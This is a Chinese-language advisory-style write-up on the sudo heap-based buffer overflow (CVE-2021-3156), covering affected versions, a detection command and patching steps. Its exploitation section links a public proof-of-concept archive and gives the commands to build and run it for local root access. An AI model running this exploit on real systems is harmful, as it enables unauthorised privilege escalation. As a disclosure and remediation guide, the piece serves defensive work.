## 一、漏洞背景

1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过 -s 或 -i
命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -i 标志运行 sudoedit
时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是
/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。

## 二、影响版本

sudo 1.8.2 - 1.8.31p2

sudo 1.9.0 - 1.9.5p1

## 三、漏洞检测

查看sudo版本

命令：sudo --version

![](https://image.3001.net/images/20210201/1612146492_6017673c1e32f0cb6462d.png!small)

  

POC：

sudoedit -s '\'

![](https://image.3001.net/images/20210201/1612146536_60176768d26a44c4e8a98.png!small)

若返回如图以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。

不受影响的系统将显示以“ usage：”开头的错误。

## 四、漏洞利用

漏洞POC:https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz

命令：

tar -xvzf CVE-2021-3156_nss_poc_ubuntu.tar.gz

make &&./sudo-hax-me-a-sandwich 0

![](https://image.3001.net/images/20210201/1612146607_601767af85acfcd72e034.png!small)

## 五、漏洞修复

下载最新的sudo版本

[https://www.sudo.ws/download.html](https://www.sudo.ws/download.html)  

命令：

wget "https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz"

tar -xvzf sudo-1.9.5p2.tar.gz

cd sudo-1.9.5p2

./configure

make && sudo make install

bash -c "sudo --version"

![](https://image.3001.net/images/20210201/1612147298_60176a622fcfff161acaf.png!small)

  

